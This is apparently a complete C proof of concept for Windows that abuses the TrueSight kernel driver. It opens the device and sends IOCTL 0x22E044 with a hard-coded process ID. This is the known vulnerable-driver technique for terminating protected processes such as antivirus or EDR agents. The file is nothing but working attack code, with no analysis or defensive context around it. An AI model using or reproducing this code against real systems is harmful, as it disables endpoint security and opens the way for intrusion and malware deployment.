#include <Windows.h>
#include <stdio.h>

#define IOCTL_CODE 0x22E044

int main() {

    DWORD bytesReturned;
    int pid = 1424;

    HANDLE hHandle = CreateFileA("\\\\.\\TrueSight", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hHandle == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open device. Error: %lu\n", GetLastError());
        return 1;
    }
    if (!DeviceIoControl(hHandle, IOCTL_CODE, &pid, sizeof(pid), &pid, sizeof(pid), &bytesReturned, NULL)) {
        printf("[-] DeviceIoControl failed. Error: %lu\n", GetLastError());
        CloseHandle(hHandle);
        return 1;
    }

    CloseHandle(hHandle);
    return 0;
}